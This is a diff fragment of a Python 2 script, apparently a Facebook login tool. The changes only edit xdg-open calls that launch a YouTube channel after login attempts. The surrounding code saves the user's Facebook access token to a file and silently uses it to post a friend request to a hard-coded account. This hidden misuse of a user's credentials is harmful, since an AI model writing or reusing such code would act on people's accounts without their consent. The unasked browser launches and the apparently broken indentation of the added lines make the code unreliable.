@@ -100,10 +100,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-             os.system('xdg-open //www.youtube.com/channel/UCiqfFbLPgGzy4U7rhep4cAQ')
+             os.system('xdg-open www.youtube.com/channel/UCiqfFbLPgGzy4U7rhep4cAQ')
     else:
         print "Wrong Username"
-         os.system('xdg-open //www.youtube.com/channel/UCiqfFbLPgGzy4U7rhep4cAQ')
+         os.system('xdg-open www.youtube.com/channel/UCiqfFbLPgGzy4U7rhep4cAQ')
 
 def login():
 	os.system('clear')
@@ -144,7 +144,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				 os.system('xdg-open //www.youtube.com/channel/UCiqfFbLPgGzy4U7rhep4cAQ')
+				 os.system('xdg-open www.youtube.com/channel/UCiqfFbLPgGzy4U7rhep4cAQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
